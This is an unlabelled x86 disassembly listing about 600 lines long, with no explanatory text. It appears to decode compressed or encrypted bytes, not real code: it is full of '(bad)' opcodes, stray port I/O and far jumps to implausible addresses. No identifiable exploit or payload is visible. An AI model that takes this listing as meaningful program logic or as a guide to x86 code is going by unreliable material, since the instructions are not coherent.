  4047ea:	ficomp DWORD PTR [ebp-0x384245de]
  4047f0:	fldenv [ebx]
  4047f2:	data16 gs inc bl
  4047f6:	mov    WORD PTR [ebp+0x68d5bbef],?
  4047fc:	mov    ds:0x31addf05,eax
  404801:	daa    
  404802:	ins    BYTE PTR es:[edi],dx
  404803:	cmp    ebp,ecx
  404805:	and    BYTE PTR [eax],bh
  404807:	dec    ecx
  404808:	aad    0xca
  40480a:	xor    eax,0x37150796
  404810:	js     0x4047b4
  404812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404813:	xchg   edx,eax
  404814:	adc    esp,DWORD PTR [ecx+0x59]
  404817:	add    ecx,ecx
  404819:	mov    dh,0x69
  40481b:	inc    edx
  40481c:	pop    ebp
  40481d:	loop   0x404830
  40481f:	sbb    BYTE PTR [eax-0x1a],al
  404822:	sbb    eax,0x65a3d8f6
  404827:	pmaddwd mm5,mm3
  40482a:	(bad)  
  40482b:	pop    ebx
  40482c:	cmp    ebx,0xffffff8e
  40482f:	clc    
  404830:	and    ebp,DWORD PTR [ebx-0x57]
  404833:	test   BYTE PTR [eax+0x2b626dbb],dl
  404839:	out    0x57,al
  40483b:	sbb    eax,0x12e4789a
  404840:	adc    DWORD PTR [edi],ebp
  404842:	mov    BYTE PTR [edi],dh
  404844:	gs adc eax,0x936bd06b
  40484a:	dec    ecx
  40484b:	out    0x79,al
  40484d:	inc    esi
  40484e:	popf   
  40484f:	jne    0x404843
  404851:	dec    ecx
  404852:	pop    edi
  404853:	ret    0x347
  404856:	sti    
  404857:	mov    ebp,0x68ce88ba
  40485c:	and    DWORD PTR [edi+0x6c5c7651],edi
  404862:	lea    edi,[ebp+esi*1+0x46f8861e]
  404869:	popa   
  40486a:	in     al,dx
  40486b:	mov    esp,0x9ea8117
  404870:	add    al,0xd5
  404872:	out    dx,al
  404873:	ret    
  404874:	mov    ds:0xf2112f51,eax
  404879:	in     eax,0xb1
  40487b:	pop    esi
  40487c:	outs   dx,BYTE PTR ds:[esi]
  40487d:	or     ebx,eax
  40487f:	rcr    esp,0x8b
  404882:	cmp    eax,0x80de47ec
  404887:	mov    eax,ds:0xb3e0c1f9
  40488c:	and    BYTE PTR [ebx-0x11],bl
  40488f:	retf   
  404890:	call   0xda2e5dab
  404895:	fbstp  TBYTE PTR [eax-0x10]
  404898:	out    0x9f,eax
  40489a:	mov    edi,edx
  40489c:	(bad)  
  40489e:	dec    ebx
  40489f:	out    dx,al
  4048a0:	sahf   
  4048a1:	imul   edi,DWORD PTR [ebp+ebx*8-0x4a],0xffffffce
  4048a6:	xchg   ebp,eax
  4048a7:	into   
  4048a8:	jbe    0x40482a
  4048aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048ac:	adc    al,0xcd
  4048ae:	in     eax,dx
  4048af:	not    bh
  4048b1:	rcr    BYTE PTR [eax+0xf1e2c2e],1
  4048b7:	enter  0xbf64,0xbf
  4048bb:	test   esp,eax
  4048bd:	and    edx,DWORD PTR [esi+0x51646337]
  4048c3:	arpl   di,cx
  4048c5:	or     BYTE PTR [edx-0x5e229417],0x41
  4048cc:	stc    
  4048cd:	jecxz  0x4048f1
  4048cf:	adc    eax,esp
  4048d1:	cmp    esi,0x88436c89
  4048d7:	push   ss
  4048d8:	pop    ecx
  4048d9:	test   BYTE PTR [edi+0x3a1134d9],0x7c
  4048e0:	shr    DWORD PTR [ecx],cl
  4048e2:	fwait
  4048e3:	push   edx
  4048e4:	cmp    cl,dl
  4048e6:	daa    
  4048e7:	iret   
  4048e8:	push   0x331caa72
  4048ed:	fst    QWORD PTR [esi+0x54477cc0]
  4048f3:	lods   al,BYTE PTR ds:[esi]
  4048f4:	xchg   BYTE PTR [edi-0xe],al
  4048f7:	out    0x64,eax
  4048f9:	dec    ebx
  4048fa:	mov    gs,WORD PTR [edi]
  4048fc:	std    
  4048fd:	push   es
  4048fe:	jbe    0x404935
  404900:	fs xchg esi,eax
  404902:	scas   al,BYTE PTR es:[edi]
  404903:	das    
  404904:	(bad)  
  404905:	xor    esi,eax
  404907:	mov    ds:0xee260d24,al
  40490c:	rep stos BYTE PTR es:[edi],al
  40490e:	pop    ecx
  40490f:	push   ecx
  404910:	repz mov eax,gs:0xb386085a
  404917:	jno    0x40497d
  404919:	push   esp
  40491a:	inc    eax
  40491b:	mov    bh,0x96
  40491d:	sub    esi,esp
  40491f:	daa    
  404920:	and    edi,ebp
  404922:	std    
  404923:	daa    
  404924:	add    BYTE PTR [ebx+0x36979ce9],ch
  40492a:	add    al,0x2c
  40492c:	pushf  
  40492d:	xchg   ebp,eax
  40492e:	mov    ah,0xaa
  404930:	loopne 0x40493e
  404932:	pop    ebx
  404933:	pushf  
  404934:	jmp    0x31ce3429
  404939:	sbb    DWORD PTR [edx-0x35],esp
  40493c:	xchg   edi,eax
  40493d:	mov    esp,0x6f159dea
  404942:	iret   
  404943:	jb     0x4048e9
  404945:	imul   edx,DWORD PTR [ecx],0x3c
  404948:	mov    esi,0xee04c6e6
  40494d:	jbe    0x404958
  40494f:	jb     0x4049ad
  404951:	mov    ebp,0x5cf73617
  404956:	js     0x404909
  404958:	ds mov esp,0x238ffd88
  40495e:	jl     0x4049b4
  404960:	adc    al,0xa7
  404962:	pop    ecx
  404963:	xor    BYTE PTR [esi],0x55
  404966:	(bad)  
  404967:	rcr    BYTE PTR [ebx+0x72],cl
  40496a:	mov    al,ds:0xf0cde4ba
  40496f:	in     eax,0xb1
  404971:	into   
  404972:	(bad)  
  404973:	xor    DWORD PTR [edx-0x3c],esi
  404976:	or     DWORD PTR [esi-0x45],ebp
  404979:	xor    esi,ebp
  40497b:	inc    ebx
  40497c:	and    eax,0xa022906f
  404981:	repz or al,0x2a
  404984:	out    0xf7,al
  404986:	push   cs
  404987:	(bad)  
  404988:	push   ss
  404989:	sub    bl,BYTE PTR [ebp+0x46]
  40498c:	stos   DWORD PTR es:[edi],eax
  40498d:	cmp    al,0xf0
  40498f:	jnp    0x4049b5
  404991:	push   edi
  404992:	call   0x956ef244
  404997:	xlat   BYTE PTR ds:[ebx]
  404998:	jg     0x4049a6
  40499a:	dec    edi
  40499b:	xchg   ecx,eax
  40499c:	out    dx,eax
  40499d:	push   es
  40499e:	mov    ch,0x8
  4049a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049a1:	cmp    eax,0xdcaae51b
  4049a6:	push   eax
  4049a7:	sbb    BYTE PTR [ecx-0x44],ah
  4049aa:	jmp    0x5668:0xba485136
  4049b1:	ret    0x1b10
  4049b4:	retf   0x815e
  4049b7:	mov    BYTE PTR [eax],ch
  4049b9:	pop    ebp
  4049ba:	and    ch,bh
  4049bc:	mov    ebx,0xf9940f39
  4049c1:	int3   
  4049c2:	pop    esp
  4049c3:	jo     0x40498a
  4049c5:	xor    ecx,edx
  4049c7:	jecxz  0x4049b3
  4049c9:	int    0xa4
  4049cb:	enter  0xe83e,0x1d
  4049cf:	push   cs
  4049d0:	push   ecx
  4049d1:	mov    edi,0x6144c6fb
  4049d6:	mov    bh,0xe3
  4049d8:	fwait
  4049d9:	jo     0x404969
  4049db:	jno    0x40496e
  4049dd:	sub    ah,al
  4049df:	fcom   DWORD PTR [ecx+0x4ce961cf]
  4049e5:	sahf   
  4049e6:	pop    ebp
  4049e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e8:	lahf   
  4049e9:	repnz mov BYTE PTR [ebx-0x34873fb9],dh
  4049f0:	or     esp,DWORD PTR [esi+edx*1]
  4049f3:	sbb    BYTE PTR [eax-0x4f5a57b0],bh
  4049f9:	mov    dl,0x12
  4049fb:	jg     0x404a26
  4049fd:	push   esp
  4049fe:	push   eax
  4049ff:	int3   
  404a00:	stc    
  404a01:	xor    DWORD PTR [edx],eax
  404a03:	stos   BYTE PTR es:[edi],al
  404a04:	jge    0x4049ce
  404a06:	fimul  WORD PTR ds:0x4331ef9d
  404a0c:	cld    
  404a0d:	in     eax,0xbf
  404a0f:	inc    ebp
  404a10:	cdq    
  404a11:	push   edx
  404a12:	jne    0x404a55
  404a14:	add    al,0x9
  404a16:	inc    ebp
  404a17:	adc    bl,BYTE PTR [edi-0x65]
  404a1a:	jp     0x404a61
  404a1c:	mov    WORD PTR [eax+0x11],?
  404a1f:	add    eax,DWORD PTR [esi+esi*2+0x1b1572a9]
  404a26:	int    0x4c
  404a28:	mov    ebx,0x2a2326a2
  404a2d:	add    eax,0x8aec5980
  404a32:	adc    eax,0x293d33f1
  404a37:	fnstcw WORD PTR [edx-0x4a]
  404a3a:	sbb    al,BYTE PTR [esi]
  404a3c:	imul   DWORD PTR [ecx+ebp*2-0x7e]
  404a40:	adc    ch,BYTE PTR [edi+0x3a42c700]
  404a46:	push   edi
  404a47:	sub    al,0x34
  404a49:	xor    BYTE PTR [ecx],dh
  404a4b:	ret    0x51af
  404a4e:	call   0x8d2864ad
  404a53:	mov    ecx,0x89745d68
  404a58:	pop    eax
  404a59:	pop    ss
  404a5a:	sub    BYTE PTR [esi-0x19c3ab41],0x3b
  404a61:	mov    WORD PTR [edx],cs
  404a63:	mov    ds:0xe707d831,eax
  404a68:	mov    ds:0xe2db73b2,al
  404a6d:	push   esi
  404a6e:	(bad)  
  404a6f:	pushf  
  404a70:	or     dl,BYTE PTR [ebx]
  404a72:	push   edx
  404a73:	int3   
  404a74:	and    cl,0x1d
  404a77:	les    eax,FWORD PTR ds:0x5d8764c4
  404a7d:	fwait
  404a7e:	sub    ecx,ecx
  404a80:	and    al,BYTE PTR [edi+0x29]
  404a83:	and    eax,0x34bbdbc6
  404a88:	lods   al,BYTE PTR cs:[esi]
  404a8a:	lea    esi,[ebp+ecx*8-0x73]
  404a8e:	sub    dl,BYTE PTR [esi-0xa]
  404a91:	(bad)  [edi]
  404a93:	call   0xd216:0x284f07c1
  404a9a:	and    DWORD PTR [ebp-0x75],0x63f7f156
  404aa1:	hlt    
  404aa2:	push   esp
  404aa3:	push   edx
  404aa4:	dec    edi
  404aa5:	or     al,0xdd
  404aa7:	pushf  
  404aa8:	pushf  
  404aa9:	cdq    
  404aaa:	push   es
  404aab:	loope  0x404a9b
  404aad:	(bad)  
  404aae:	loopne 0x404b21
  404ab0:	test   DWORD PTR [ecx-0x73],esi
  404ab3:	jp     0x404a74
  404ab5:	ss ins BYTE PTR es:[edi],dx
  404ab7:	mov    esi,0x166f700e
  404abc:	pop    es
  404abd:	xlat   BYTE PTR ds:[ebx]
  404abe:	arpl   WORD PTR [ebx+edx*8-0x54],dx
  404ac2:	adc    al,0xb
  404ac4:	idiv   eax
  404ac6:	pop    ecx
  404ac7:	add    BYTE PTR [esi+0x24],bh
  404aca:	jg     0x404b45
  404acc:	or     eax,0x678af89d
  404ad1:	arpl   WORD PTR [ebp-0x35],ax
  404ad4:	imul   ecx,DWORD PTR [ebp-0x5fbe707a],0xf19a7787
  404ade:	cmp    al,0xd
  404ae0:	cmp    al,0xc8
  404ae2:	dec    esi
  404ae3:	push   ds
  404ae4:	in     al,dx
  404ae5:	mov    al,0xf8
  404ae7:	jmp    0xb229:0xbfa0933c
  404aee:	or     al,0x4a
  404af0:	enter  0x7499,0xe
  404af4:	dec    ebx
  404af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404af6:	hlt    
  404af7:	xchg   esp,eax
  404af8:	jmp    0x2e05:0xf6be6c9d
  404aff:	xor    al,0x94
  404b01:	or     al,0xe5
  404b03:	bound  eax,QWORD PTR [esi+ecx*4]
  404b06:	ss pop edx
  404b08:	scas   eax,DWORD PTR es:[edi]
  404b09:	iret   
  404b0a:	adc    BYTE PTR [ebx],dl
  404b0c:	add    dh,dl
  404b0e:	or     eax,0x95533eed
  404b13:	sub    esi,DWORD PTR [edi+0x7d9ea4d8]
  404b19:	sub    eax,0xbcdb0408
  404b1e:	mov    edx,0xa69dc9c2
  404b23:	xchg   BYTE PTR [edi-0x48f7f61a],bl
  404b29:	jmp    0x4eda08e9
  404b2e:	add    BYTE PTR [ecx],al
  404b30:	ror    dl,1
  404b32:	or     cl,cl
  404b34:	pushf  
  404b35:	and    ch,al
  404b37:	or     bl,dh
  404b39:	in     al,dx
  404b3a:	or     bl,bh
  404b3c:	not    BYTE PTR [ecx]
  404b3e:	push   0x33
  404b40:	mov    al,ds:0x5b15f329
  404b45:	add    ecx,esp
  404b47:	loope  0x404aef
  404b49:	stc    
  404b4a:	inc    esp
  404b4b:	loopne 0x404ad2
  404b4d:	adc    BYTE PTR [eax],0xcf
  404b50:	and    al,dl
  404b52:	inc    edi
  404b53:	push   0xffffff9a
  404b55:	mov    ebx,0xa7620d21
  404b5a:	sahf   
  404b5b:	push   ebx
  404b5c:	xchg   edx,eax
  404b5d:	lea    esp,[ebx+0x1a]
  404b60:	test   DWORD PTR [ecx],0xd596b683
  404b66:	arpl   WORD PTR [esi-0x20],sp
  404b69:	mov    DWORD PTR [edi+0x6ebe7c5f],eax
  404b6f:	or     eax,edx
  404b71:	lds    ebp,FWORD PTR [eax+0x13f7bf9b]
  404b77:	stos   BYTE PTR es:[edi],al
  404b78:	nop
  404b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b7a:	jae    0x404b08
  404b7c:	stos   BYTE PTR es:[edi],al
  404b7d:	sub    BYTE PTR [edx+0xb],dh
  404b80:	repz test al,0x76
  404b83:	mov    cl,0xb9
  404b85:	pop    ebp
  404b86:	loopne 0x404ba8
  404b88:	mov    WORD PTR [edx+0x27fbe743],cs
  404b8e:	repz in eax,0x44
  404b91:	cmp    DWORD PTR [ecx],ecx
  404b93:	sbb    al,0xca
  404b95:	lock pop ebx
  404b97:	xchg   ebx,eax
  404b98:	ins    BYTE PTR es:[edi],dx
  404b99:	add    ebx,DWORD PTR [edx-0x731c762f]
  404b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ba0:	push   ss
  404ba1:	mov    al,ds:0x16629050
  404ba6:	jns    0x404b6e
  404ba8:	inc    edi
  404ba9:	mov    eax,ds:0xcbf7cc7b
  404bae:	mov    cl,0x8b
  404bb0:	(bad)  
  404bb1:	xlat   BYTE PTR ds:[ebx]
  404bb2:	retf   
  404bb3:	js     0x404bfc
  404bb5:	mov    ecx,0x24e6f005
  404bba:	call   0x851:0x6057f1e9
  404bc1:	mov    ah,0xde
  404bc3:	sbb    DWORD PTR [edx+esi*1+0x1c],edi
  404bc7:	mov    al,ds:0x9a1a2798
  404bcc:	add    al,0x5a
  404bce:	mov    ebp,0x726502e1
  404bd3:	push   edx
  404bd4:	dec    ebx
  404bd5:	push   ebx
  404bd6:	retf   
  404bd7:	xchg   ebx,eax
  404bd8:	(bad)  
  404bd9:	push   edx
  404bda:	inc    eax
  404bdb:	mov    ecx,0xa9fdbdb1
  404be0:	push   0x1a
  404be2:	nop
  404be3:	xchg   ebp,eax
  404be4:	pop    ebp
  404be5:	push   esp
  404be6:	(bad)  
  404be7:	call   0xd1b4b0e
  404bec:	mov    eax,gs
  404bee:	or     eax,0x6605b754
  404bf3:	imul   ecx,DWORD PTR [ebx],0xffffffd6
  404bf6:	xchg   edi,eax
  404bf7:	test   al,0x5c
  404bf9:	xchg   DWORD PTR [ecx-0x64f81f32],edx
  404bff:	xchg   cx,ax
  404c01:	add    bl,BYTE PTR [eax+esi*4]
  404c04:	jbe    0x404c60
  404c06:	mov    dl,0xa2
  404c08:	retf   
  404c09:	int    0x8f
  404c0b:	jbe    0x404bc8
  404c0d:	lea    eax,[edx+ebx*2+0x5555e668]
  404c14:	(bad)  
  404c15:	icebp  
  404c16:	ds push eax
  404c18:	push   DWORD PTR ds:0x62b7378b
  404c1e:	aam    0x34
  404c20:	(bad)  
  404c21:	enter  0xab59,0xda
  404c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c26:	or     DWORD PTR [eax+0x24fcf5fd],esi
  404c2c:	pop    edx
  404c2d:	pop    ebp
  404c2e:	fwait
  404c2f:	add    eax,0xa5a5d848
  404c34:	mov    ah,0xe1
  404c36:	aad    0x6f
  404c38:	test   eax,0x993a0941
  404c3d:	fbstp  TBYTE PTR [edx+0x4b]
  404c40:	mul    DWORD PTR ss:[di+0x2228]
  404c46:	xlat   BYTE PTR ds:[ebx]
  404c47:	adc    al,0xb
  404c49:	push   cs
  404c4a:	xchg   edx,eax
  404c4b:	and    ebx,DWORD PTR [ecx+0x22c77409]
  404c51:	int3   
  404c52:	mov    bh,0x50
  404c54:	cmp    ch,al
  404c56:	in     eax,dx
  404c57:	mov    WORD PTR [esi+eax*8],ds
  404c5a:	pop    ecx
  404c5b:	(bad)  
  404c5c:	sub    ebx,DWORD PTR [edi]
  404c5e:	add    eax,0x55646470
  404c63:	and    ebx,ecx
  404c65:	loop   0x404c1d
  404c67:	push   eax
  404c68:	aas    
  404c69:	test   BYTE PTR [ecx],0x1b
  404c6c:	push   es
  404c6d:	stos   BYTE PTR es:[edi],al
  404c6e:	jl     0x404c35
  404c70:	inc    edx
  404c71:	ins    BYTE PTR es:[edi],dx
  404c72:	jae    0x404c29
  404c74:	pushf  
  404c75:	xchg   ebx,eax
  404c76:	in     eax,dx
  404c77:	add    edx,DWORD PTR [edx]
  404c79:	xchg   BYTE PTR [esi+0x6d99bd48],ah
  404c7f:	nop
  404c80:	cmp    ebx,DWORD PTR [ebp+0x5b8967d2]
  404c86:	in     al,dx
  404c87:	(bad)  
  404c89:	out    0x44,eax
  404c8b:	or     DWORD PTR [ecx],eax
  404c8d:	xchg   edi,eax
  404c8e:	je     0x404c31
  404c90:	push   cs
  404c91:	sar    BYTE PTR [edx+0x5063b030],1
  404c97:	mov    bh,0x8e
  404c99:	inc    eax
  404c9a:	cmp    esi,DWORD PTR [edi]
  404c9c:	fstp   TBYTE PTR [esi]
  404c9e:	(bad)  
  404c9f:	ins    BYTE PTR es:[edi],dx
  404ca0:	repz out 0xa3,eax
  404ca3:	(bad)  
  404ca4:	xchg   esi,eax
  404ca5:	jb     0x404d15
  404ca7:	rol    bh,0xc9
  404caa:	pop    esi
  404cab:	jge    0x404c50
  404cad:	sub    ch,BYTE PTR [esi+0xda0767]
  404cb3:	les    esi,FWORD PTR [esi+0x7f]
  404cb6:	mov    ebp,0xcffd3deb
  404cbb:	and    eax,0xbaf1f4c8
  404cc0:	lods   al,BYTE PTR ds:[esi]
  404cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc2:	mov    ebp,0xb060812e
  404cc7:	enter  0xa399,0x4
  404ccb:	dec    edi
  404ccc:	pop    es
  404ccd:	jg     0x404d08
  404ccf:	hlt    
  404cd0:	pop    ecx
  404cd1:	add    BYTE PTR [ecx],ch
  404cd3:	lds    edi,FWORD PTR [ebx-0x6a]
  404cd6:	cli    
  404cd7:	inc    ebp
  404cd8:	mov    WORD PTR [esi],cs
  404cda:	into   
  404cdb:	pop    ebx
  404cdc:	mov    esi,0xc83d9a8c
  404ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce2:	imul   ecx,DWORD PTR ds:0x3489ceee,0x1e08e87a
  404cec:	loop   0x404cba
  404cee:	dec    esi
  404cef:	mov    dh,0xec
  404cf1:	sbb    al,0xff
  404cf3:	rol    DWORD PTR [eax],1
  404cf5:	mov    WORD PTR [eax+0x1e45896a],ds
  404cfb:	jmp    0x404d1c
  404cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cfe:	xchg   edx,eax
  404cff:	sahf   
  404d00:	xor    eax,0xce1cc253
  404d05:	std    
  404d06:	int    0x34
  404d08:	mov    ds:0xb58219e5,al
  404d0d:	mov    eax,ds:0x363b1ca2
  404d12:	xor    dl,BYTE PTR [esi]
  404d14:	push   ss
  404d15:	repnz mov cl,0x90
  404d18:	jbe    0x404d05
  404d1a:	pop    esi
  404d1b:	jmp    0xec140a73
  404d20:	ss inc edi
  404d22:	xor    eax,0xcc2d137
  404d27:	push   edx
  404d28:	pushf  
  404d29:	in     eax,0x88
  404d2b:	fs mov ebx,0xe117d117
  404d31:	pusha  
  404d32:	pop    ecx
  404d33:	xor    esp,DWORD PTR ds:0xece97a26
  404d39:	and    eax,DWORD PTR fs:[ebp+0x751e878d]
  404d40:	les    ecx,FWORD PTR [edi+0x19012169]
  404d46:	aaa    
  404d47:	fs mov ah,0xb8
  404d4a:	mov    ds:0xdc687134,eax
  404d4f:	cli    
  404d50:	shrd   DWORD PTR [edx],edi,0x69
  404d54:	mov    cl,0x18
  404d56:	cmp    eax,0xf58556ac
  404d5b:	stos   BYTE PTR es:[edi],al
  404d5c:	push   0x28
  404d5e:	stos   DWORD PTR es:[edi],eax
  404d5f:	pusha  
  404d60:	push   esp
  404d61:	push   ebp
  404d62:	(bad)  
  404d63:	cmp    BYTE PTR [edi-0x1b1b6922],al
  404d69:	je     0x404d88
  404d6b:	jle    0x404d1f
  404d6d:	inc    edi
  404d6e:	mov    bl,BYTE PTR [esi]
  404d70:	dec    edi
  404d71:	or     eax,0x623647a2
  404d76:	cs popa 
  404d78:	inc    edx
  404d79:	xor    DWORD PTR [esp+esi*4],esp
  404d7c:	lea    ebp,[ecx]
  404d7e:	inc    esp
  404d7f:	dec    eax
  404d80:	jmp    0x404dd9
  404d82:	push   ecx
  404d83:	mov    ah,0x51
  404d85:	pop    edi
  404d86:	loope  0x404d64
  404d88:	mov    WORD PTR [edx],ss
  404d8a:	xchg   ecx,eax
  404d8b:	stos   DWORD PTR es:[edi],eax
  404d8c:	pop    eax
  404d8d:	(bad)  
  404d8e:	in     al,0x74
  404d90:	sub    ebx,DWORD PTR [edx+eax*2+0x5e]
  404d94:	push   edx
  404d95:	arpl   WORD PTR [edx-0x31eeef0],bx
  404d9b:	(bad)  
  404d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d9d:	out    dx,al
  404d9e:	mov    eax,0x953c8829
  404da3:	add    eax,0xaa8002b4
  404da8:	(bad)  
  404da9:	stos   DWORD PTR es:[edi],eax
  404daa:	das    
  404dab:	xchg   edi,eax
  404dac:	dec    ecx
  404dad:	pop    ss
  404dae:	std    
  404daf:	jo     0x404d62
  404db1:	ins    DWORD PTR es:[edi],dx
  404db2:	mov    ah,0xcc
  404db4:	add    al,0xcf
  404db6:	adc    BYTE PTR [ebp+ecx*1+0x67],bl
  404dba:	loopne 0x404d7a
  404dbc:	fcom   st(5)
  404dbe:	ins    BYTE PTR es:[edi],dx
  404dbf:	or     ecx,DWORD PTR [eax+0x16]
  404dc2:	xor    dl,BYTE PTR [ecx-0x5b]
  404dc5:	clc    
  404dc6:	in     eax,0x32
  404dc8:	sub    DWORD PTR [ebx],0xffffffae
  404dcb:	inc    eax
  404dcc:	dec    edx
  404dcd:	pop    esp
  404dce:	and    dl,dh
  404dd0:	push   edx
  404dd1:	xlat   BYTE PTR ds:[ebx]
  404dd2:	or     BYTE PTR [ecx+ebx*2],cl
  404dd5:	les    eax,FWORD PTR [ecx+ecx*4+0x4c]
  404dd9:	inc    edx
  404dda:	and    ch,ch
  404ddc:	lods   al,BYTE PTR ds:[esi]
  404ddd:	stos   BYTE PTR es:[edi],al
  404dde:	bnd jmp 0x404db4
  404de1:	sub    bh,BYTE PTR [edi+0x22]
  404de4:	shr    BYTE PTR [esi],0xb
  404de7:	outs   dx,DWORD PTR ds:[esi]
  404de8:	lock call 0x80d6a32
  404dee:	adc    bl,ch
  404df0:	sbb    ebp,DWORD PTR [esi]
  404df2:	scas   eax,DWORD PTR es:[edi]
  404df3:	push   si
  404df5:	xchg   ch,ch
  404df7:	imul   esp,DWORD PTR [edi+0x12],0xffffffc9
  404dfb:	sub    al,BYTE PTR [ebp-0x424736ce]
  404e01:	cdq    
  404e02:	loop   0x404dac
  404e04:	pause  
  404e06:	push   ds
  404e07:	add    ebx,DWORD PTR [ebp-0x61cf0236]
  404e0d:	pop    es
  404e0e:	stos   DWORD PTR es:[edi],eax
  404e0f:	jge    0x404e6a
  404e11:	pop    ebp
  404e12:	xor    BYTE PTR [ecx+edi*1-0x65],0xa1
  404e17:	test   BYTE PTR [ecx-0x3fb9029a],dh
  404e1d:	mov    edx,0x75e4d4e9
  404e22:	jnp    0x404e1b
  404e24:	bound  ebp,QWORD PTR [esi-0x45]
  404e27:	sar    BYTE PTR [eax-0x5b1f334c],0xc
  404e2e:	sub    eax,0x51566263
  404e33:	or     ebp,ebx
  404e35:	or     dl,ch
  404e37:	in     eax,dx
  404e38:	dec    esi
  404e39:	mov    ah,0x8d
  404e3b:	lods   eax,DWORD PTR ds:[esi]
  404e3c:	xor    eax,DWORD PTR [esi+ebx*8+0x3e0590f1]
  404e43:	xchg   BYTE PTR [ebx],cl
  404e45:	js     0x404e83
  404e47:	inc    edi
  404e48:	(bad)  [ebp-0x4c396b57]
  404e4e:	adc    bl,BYTE PTR [edi-0x24]
  404e51:	test   eax,0x16c06492
  404e56:	or     DWORD PTR [edx+edx*4],0xfffffff7
  404e5a:	stc    
  404e5b:	(bad)  
  404e5c:	ss in  al,dx
  404e5e:	ret    
  404e5f:	or     ecx,DWORD PTR [ebx+ecx*8]
  404e62:	pusha  
  404e63:	xchg   edx,eax
  404e64:	mov    esi,0xe785b1cc
  404e69:	inc    esp
  404e6a:	shl    BYTE PTR [eax+0x38],cl
  404e6d:	mov    DWORD PTR [edx+0x2f],ebp
  404e70:	pop    ebp
  404e71:	gs xchg esi,eax
  404e73:	stos   DWORD PTR es:[edi],eax
  404e74:	loop   0x404e8d
  404e76:	pop    eax
  404e77:	xchg   edx,eax
  404e78:	mov    cl,0x54
  404e7a:	fs jo  0x404ec7
  404e7d:	js     0x404e65
  404e7f:	out    dx,al
  404e80:	daa    
  404e81:	sbb    BYTE PTR [ebx],ch
  404e83:	inc    edx
  404e84:	xor    dh,BYTE PTR [edi+0x72db8d2a]
  404e8a:	lock je 0x404ef2
  404e8d:	xlat   BYTE PTR ds:[ebx]
  404e8e:	outs   dx,BYTE PTR ds:[esi]
  404e8f:	test   BYTE PTR [ebx+ebx*4],al
  404e92:	sub    DWORD PTR [esi*8+0x75159f90],edi
  404e99:	in     eax,0x61
  404e9b:	aaa    
  404e9c:	jo     0x404e41
  404e9e:	loope  0x404ebf
  404ea0:	dec    ebx
  404ea1:	in     eax,0xa8
  404ea3:	sbb    eax,0x644dcf08
  404ea8:	dec    edx
  404ea9:	add    eax,ebp
  404eab:	jecxz  0x404e9d
  404ead:	loop   0x404e5d
  404eaf:	xchg   ecx,eax
  404eb0:	jne    0x404ebe
  404eb2:	cld    
  404eb3:	jne    0x404ece
  404eb5:	sbb    BYTE PTR [edx-0xaa0c6a7],dl
  404ebb:	sar    BYTE PTR [esp+ecx*8],0x3
  404ebf:	jb     0x404eb5
  404ec1:	jne    0x404e4a
  404ec3:	ss sbb dl,bh
  404ec6:	sbb    eax,0x6658d171
  404ecb:	shr    BYTE PTR [edx-0x1c],cl
  404ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ecf:	gs add eax,0x6a9e2f9a
  404ed5:	mov    edi,0x31a4c5b6
  404eda:	cs scas eax,DWORD PTR es:[edi]
  404edc:	or     edi,DWORD PTR [edi]
  404ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404edf:	cli    
  404ee0:	lds    esi,FWORD PTR [edi]
  404ee2:	repnz mov ch,0xbd
  404ee5:	push   0x76a10d38
  404eea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eeb:	push   edx
  404eec:	fidiv  WORD PTR [edi]
  404eee:	in     eax,0x9
  404ef0:	add    edi,DWORD PTR [edx+0x5698730a]
  404ef6:	mov    ah,0x2e
  404ef8:	push   edi
  404ef9:	call   0x78925ec
  404efe:	xchg   DWORD PTR [edx-0x31],esi
  404f01:	out    dx,al
  404f02:	adc    dh,BYTE PTR [ebx+eiz*8-0x359034f5]
  404f09:	outs   dx,DWORD PTR ds:[esi]
  404f0a:	ins    DWORD PTR es:[edi],dx
  404f0b:	leave  
  404f0c:	jp     0x404eff
  404f0e:	in     al,dx
  404f0f:	shr    DWORD PTR [ecx-0xe],cl
  404f12:	inc    ebp
  404f13:	add    ch,al
  404f15:	ret    
  404f16:	mov    dh,0x54
  404f18:	mov    dl,bl
  404f1a:	xor    al,0x1e
  404f1c:	jmp    0x28d63916
  404f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f22:	push   es
  404f23:	and    BYTE PTR [ebp+0x17],0xbb
  404f27:	dec    eax
  404f28:	or     eax,0x8f105efd
  404f2d:	mov    eax,0xb5a0be28
  404f32:	jbe    0x404ee8
  404f34:	cmp    dh,ch
  404f36:	push   ds
  404f37:	daa    
  404f38:	mov    ds,WORD PTR [edx+0x568a151c]
  404f3e:	lds    ebx,FWORD PTR [eax]
  404f40:	pop    ss
  404f41:	pop    ebp
  404f42:	clc    
  404f43:	mov    al,ds:0xc9e91944
  404f48:	imul   edi,DWORD PTR [ebp+0x3ffb1583],0x1e
  404f4f:	shl    esp,cl
  404f51:	jo     0x404f65
  404f53:	dec    edi
  404f54:	xchg   esi,eax
  404f55:	gs jnp 0x404f9a
  404f58:	add    DWORD PTR [ebx],0xffffffb7
  404f5b:	pop    ebx
  404f5c:	test   ecx,ebx
  404f5e:	dec    ecx
  404f5f:	adc    eax,0xa484739a
  404f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f65:	ja     0x404f93
  404f67:	push   0x3c
  404f69:	xor    ebp,DWORD PTR [eax-0x78]
  404f6c:	loopne 0x404f2b
  404f6e:	les    ebx,FWORD PTR [esi]
  404f70:	retf   
  404f71:	add    al,0x6e
  404f73:	fadd   st(4),st
  404f75:	ret    0x908e
  404f78:	dec    ebp
  404f79:	inc    esp
